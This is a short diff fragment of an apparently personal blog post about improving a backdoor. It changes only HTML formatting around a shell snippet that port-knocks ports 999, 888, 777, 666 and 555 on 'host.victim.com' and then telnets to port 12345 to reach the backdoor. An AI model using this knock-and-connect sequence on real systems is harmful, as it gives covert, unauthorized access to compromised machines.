@@ -21,12 +21,12 @@ I’ve decided to improve a bit the backdoor for my self usage.  Because I’m a
 
 sh:
 
-
+<table>
 \# t="telnet host.victim.com"
 
 
 \# <font color="red">$t 999; $t 888; $t 777 ; $t 666; $t 555;</font> $t <font color="green">12345</font>  ; sleep 1 ; $t <font color="blue">12345</font> 
-
+</table>
 
 
 In <font color="red">red</font>: The knocking SYN phase. We will send SYN packets on port 999, 888, 777, 666 and 555
